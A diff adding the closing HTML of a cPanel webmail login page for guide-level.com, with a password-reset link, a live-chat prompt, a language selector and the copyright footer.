+                                            <a href="https://guide-level.com:2096/resetpass?start=1" class="login-form__reset-pass btn btn--link" id="reset_password">Reset Password</a>
+                                        </div>
+                                                                    </div>
+
+                                <div class="clear" id="push"></div>
+
+                                
+                            </form>
+                        <!--CLOSE forms -->
+                        </div>
+                    <!--CLOSE login-sub -->
+                    </div>
+                    
+
+                                    <!--CLOSE wrapper -->
+                </div>
+            <!--CLOSE login-sub-container -->
+            </div>
+        <!--CLOSE login-container -->
+        </div>
+
+        
+
+        
+            <!-- Promo Chat — Copy this HTML -->
+            <div class="promo-chat">
+                <div class="grid-col">
+                    <p>Need help? We're always here for you.</p>
+                    <p>
+                        <a href="https://guide-level.com:2096/unprotected/nc-cpanel/nc-livechat/live-chat.php" target="_blank" class="btn btn--green btn--large">Chat with a Live Person</a>
+                    </p>
+                </div>
+            </div>
+            <!-- END of Promo Chat — End of Copy this HTML -->
+        
+
+        
+        
+        <div id="locale-footer" style="display: block;">
+            <div class="locale-container">
+                <noscript>
+                    <form method="post" action="second">
+                        <select name="locale">
+                            <option value="">Change locale</option>
+                            <option value='ar'>العربية</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                        </select>
+                        <button style="margin-left: 10px" type="submit">Change</button>
+                    </form>
+                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
+                </noscript>
+                <ul id="locales_list" class="locales_list">
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=ar">العربية</a></li>
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=cs">čeština</a></li>
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=da">dansk</a></li>
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=de">Deutsch</a></li>
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=el">Ελληνικά</a></li>
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=es">español</a></li>
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=es_419">español&nbsp;latinoamericano</a></li>
+                    
+                        
+                        <li><a href="https://guide-level.com:2096/?locale=es_es">español&nbsp;de&nbsp;España</a></li>
+                    
+                        
+					
+                        <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
+                    
+                </ul>
+                <div id="mobilelocalemenu">Select a locale:
+                    <a href="javascript:void(0)" onclick="toggle_locales(true)" title="Change locale">English</a>
+                </div>
+            </div>
+        </div>
+    <!--Close wrapper -->
+    </div>
+<!--Close login-wrapper -->
+</div>
+
+
+<style>
+    @media (min-width: 481px) {
+        #select_user_form {
+            width: px;
+        }
+    }
+</style>
+    <div class="copyright">Copyright©&nbsp;2025 cPanel, L.L.C.
+    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
+
+
+
+
+</body></html>
